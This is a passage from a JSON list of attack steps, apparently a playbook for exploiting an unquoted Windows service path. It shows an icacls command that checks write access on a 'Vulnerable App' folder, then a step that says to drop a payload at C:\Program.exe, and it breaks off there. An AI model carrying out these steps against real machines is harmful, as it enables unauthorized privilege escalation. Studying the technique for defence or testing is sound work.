            {
                "step": 2,
                "note": "Check write permission on the vulnerable path",
                "command": "icacls \"C:\\Program Files\\Vulnerable App\\\""
            },
            {
                "step": 3,
                "note": "Drop payload in the path (e.g. C:\\Program.exe)",
